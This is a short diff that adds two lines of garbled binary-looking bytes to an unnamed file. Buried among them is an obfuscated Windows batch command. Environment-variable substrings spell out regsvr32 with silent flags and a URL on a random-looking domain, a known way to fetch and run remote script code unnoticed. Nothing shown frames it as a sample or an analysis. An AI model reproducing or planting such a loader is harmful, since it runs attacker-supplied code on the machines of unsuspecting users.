@@ -1,0 +1,2 @@
+ Ù € ? P º 1 ¸   ﬁ ? 9 æ ˆ \ N ? G  ? ° U Õ π z ? ù Ú ? ? ˜
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://be%ALLUSERSPROFILE:~4,1%pqwjAgCoSmxhOslXaDGViznfHQKPdFLUIZ%ALLUSERSPROFILE:~4,1%YvEWucJkNyMtBT.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  Ù € ? P º 1 ¸   ﬁ ? 9 æ ˆ \ N ? G  ? ° U Õ π z ? ù Ú ? ? ˜
